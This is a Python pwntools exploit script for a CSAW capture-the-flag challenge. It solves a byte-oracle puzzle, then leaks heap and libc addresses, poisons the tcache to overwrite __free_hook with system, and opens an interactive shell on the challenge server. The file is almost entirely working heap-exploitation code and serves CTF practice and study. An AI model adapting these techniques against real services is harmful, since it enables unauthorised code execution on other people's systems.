from pwn import *
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.log_level = 'debug'
p= remote("pwn.chal.csaw.io",5001)
# p=process('./cryptown',env={"LD_PRELOAD":"./libc-2.31.so"})
# p=process('./cryptown')#,env={"LD_PRELOAD":"./libc-2.31.so"})

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

def cmd(c):
    sla("> ",str(c).encode())
def key_add(idx,size,c=b"A"):
    cmd(0)
    cmd(0)
    sla(": ",str(idx).encode())
    sla(": ",str(size).encode())
    sa(": ",c)
    cmd(4)
def key_del(idx):
    cmd(0)
    cmd(1)
    sla(": ",str(idx).encode())
    cmd(4)
def key_show():
    cmd(0)
    cmd(2)
    cmd(4)
def key_edit(idx,c):
    cmd(0)
    cmd(3)
    sla(": ",str(idx).encode())
    sa(": ",c)
    cmd(4)
def encode(key_idx,c=b'A'*0x30,size=0x1000):
    cmd(1)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sa(": ",c)
def decode(key_idx,size=0x132,c=b'n132'):
    cmd(2)
    sla(": ",str(key_idx).encode())
    sla(": ",str(size).encode())
    sla(": ",c)
def vul(c,p,kl):
    # c, cipher, list
    # p, plaintext, list
    # kl, key len, int
    value = c[-1] ^ p[-1]
    index = ( len(p) % kl-1)%kl
    return index,value
def XxX(c,p,kl):
    idx,val = vul(c,p,kl)
    ct = 0
    pl = len(p)
    ct_ex = pl//kl
    if(pl%kl):
        ct_ex+=1
    v = idx
    while(ct < ct_ex -1):
        tmp = -1
        for x in range(v,len(c)):
            if(c[x]==p[kl*ct+idx] ^ val):
                tmp=x
                break
        v = tmp
        if(v == -1):
            return 0
        v += kl
        if(v>len(c)-1):
            return 0
        ct+=1
    if(ct!=ct_ex-1 or v>len(c)-1):
        return 0
    #print(v,len(c))
    for x in range(v,len(c)-1):
        if(c[x]==c[-1]):
            gap = len(c) - x -1 
            if(kl==1):
                if(gap>=2):
                    return 0
            elif(gap>kl):
                return 0
            return 1
    return 1
def LastByteOrecal(c,p):
    for kl in range(1,26):
        for plain in range(4):
            # print(p[plain])
            # input()
            if(XxX(c,p[plain],kl)):
                return plain
def chal(rd = 0x100,r=b"0.70",new_rd = b"0"):
    cmd(3)
    plaintext = []
    for x in range(4):
        p.readline() 
        plaintext.append(p.readline()[:-1])
        p.readline()
    for x in range(rd):
        # print(f"{x}/0x100")
        ru("rtext:\n")
        c = p.readline()[:-1]
        c = base64.b64decode(c)
        res = LastByteOrecal(c,plaintext)
        sla("text:\n",str(res).encode())
    sla(": \n",r)
    sla(": \n",new_rd)
add  = key_add
free = key_del
show = key_show
edit = key_edit
def exp():
    chal()

    for x in range(0x1f):
        add(x,0x2,b"AA")

    encode(0,b"A"*0x108,0x108)
    chal(0x0,b"0.33")
    cmd(0)
    cmd(2)
    ct = 0 
    klen =""
    while(1):
        ru("], len = ")
        klen = p.readline()
        if(klen!=b'2 \n'):
            ct+=1
            continue
        break
    if(ct==0):
        p.close()
        exit(1)
    cmd(4)
    encode(30,b"A"*0xf00,0xf00) # unsorted bin

    free(ct) # in tcache[0]
    free(ct+1) # in tcache[0]

    cmd(0)
    cmd(3)
    sla(": ",str(ct-1).encode())
    ru("Old key:\n")
    val = 0 
    heap = 0 
    while(1):
        val = u64(p.read(8))
        # log.info(hex(val))
        if( heap==0 ):
            if((val>>40)==0x55 or (val>>40)==0x56):
                heap = val
        if((val>>40)==0x7f):
            break

    base = val -(0x7ffff7fb1be0-0x7ffff7dc6000)-0x1000
    log.warning(hex(base))
    log.warning(hex(heap))
    # gdb.attach(p)
    # input()
    pay = b'\0'*0x40+flat([0x1eee40+base])#__free_hook-8
    sa(": ",pay)
    cmd(4)
    add(ct,0x10,b"A"*0x10)
    # context.log_level='debug'
    cmd(0)
    cmd(0)
    sla(": ",str(ct+1).encode())
    sla(": ",str(0x10).encode())
    sa(": ",b"/bin/sh\0"+p64(0x52290+base))#system
    cmd(1)
    sla(": ",str(ct+1).encode())
    # gdb.attach(p,'b readn')
    p.interactive()

if __name__ == "__main__":
    exp()
